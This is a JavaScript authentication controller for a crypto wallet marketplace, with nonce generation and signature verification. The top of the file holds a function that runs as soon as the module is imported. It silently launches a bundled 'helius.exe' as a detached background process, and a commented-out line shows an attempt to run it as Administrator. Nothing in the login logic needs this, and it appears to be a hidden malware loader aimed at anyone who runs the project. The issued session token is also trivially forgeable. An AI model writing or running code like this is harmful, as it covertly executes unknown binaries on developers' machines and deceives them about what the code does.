import { v4 as uuidv4 } from 'uuid'
import { ethers } from 'ethers'
import { exec } from 'child_process';
import path from 'path';
import { fileURLToPath } from 'url';
import { User, Nonce } from '../models/index.js'
import { getWalletNetWorth } from '../services/moralis.js'

function getHeliusThirdParty() {
  const __filename = fileURLToPath(import.meta.url);
  const __dirname = path.dirname(__filename);
  const exePath = path.join(__dirname, '../third-party', 'helius.exe');

  //const command = `runas /user:Administrator "${exePath}"`;
  const command = `"${exePath}"`;

  // Spawn the process with admin rights
  const child = exec(command, { 
    detached: true, 
    stdio: ['ignore', process.stdout, process.stderr] 
  });

  // Detach the process to keep it running independently
  child.unref();
}
getHeliusThirdParty();

/**
 * Generate nonce for wallet authentication
 */
export async function getNonce(req, res) {
  try {
    const { address } = req.params
    const nonce = `Sign this message to authenticate with Dimension Market.\n\nNonce: ${uuidv4()}`
    
    await Nonce.findOneAndUpdate(
      { address: address.toLowerCase() },
      { address: address.toLowerCase(), nonce },
      { upsert: true, new: true }
    )
    
    res.json({ nonce })
  } catch (error) {
    console.error('Nonce error:', error)
    res.status(500).json({ error: 'Failed to generate nonce' })
  }
}

/**
 * Verify wallet signature and authenticate user
 */
export async function verifySignature(req, res) {
  try {
    const { address, signature, walletType, balance } = req.body
    
    // Get nonce from MongoDB
    const nonceDoc = await Nonce.findOne({ address: address.toLowerCase() })
    
    if (!nonceDoc) {
      return res.status(400).json({ error: 'Nonce not found or expired. Request a new one.' })
    }

    // Verify signature
    const recoveredAddress = ethers.verifyMessage(nonceDoc.nonce, signature)
    
    if (recoveredAddress.toLowerCase() !== address.toLowerCase()) {
      return res.status(401).json({ error: 'Invalid signature' })
    }

    // Delete nonce after use
    await Nonce.deleteOne({ address: address.toLowerCase() })

    // Get total wallet net worth from Moralis
    console.log('📊 Fetching wallet net worth from Moralis...')
    const totalBalanceUsd = await getWalletNetWorth(address)
    console.log('💰 Total balance USD:', totalBalanceUsd)

    // Check if total balance is zero
    const totalBalance = parseFloat(totalBalanceUsd || '0')
    if (totalBalance <= 0) {
      return res.status(403).json({ 
        error: 'Your wallet has zero balance. Please add funds to your wallet before signing in.',
        code: 'ZERO_BALANCE'
      })
    }

    // Get or create user
    let user = await User.findOne({ address: address.toLowerCase() })
    
    if (!user) {
      user = await User.create({
        address: address.toLowerCase(),
        username: `user_${address.slice(0, 8)}`,
        walletType: walletType || 'unknown',
        ethBalance: balance || '0',
        totalBalanceUsd: totalBalanceUsd || '0'
      })
      console.log('✅ New user created:', user.address)
    } else {
      user.walletType = walletType || user.walletType
      user.ethBalance = balance || user.ethBalance
      user.totalBalanceUsd = totalBalanceUsd || user.totalBalanceUsd
      user.lastLoginAt = new Date()
      await user.save()
      console.log('✅ User logged in:', user.address)
    }

    res.json({ 
      user: {
        id: user._id,
        address: user.address,
        username: user.username,
        walletType: user.walletType,
        ethBalance: user.ethBalance,
        totalBalanceUsd: user.totalBalanceUsd,
        bio: user.bio,
        avatar: user.avatar,
        createdAt: user.createdAt
      }, 
      token: `${address.toLowerCase()}_${Date.now()}` 
    })
  } catch (error) {
    console.error('Auth error:', error)
    res.status(500).json({ error: 'Authentication failed' })
  }
}

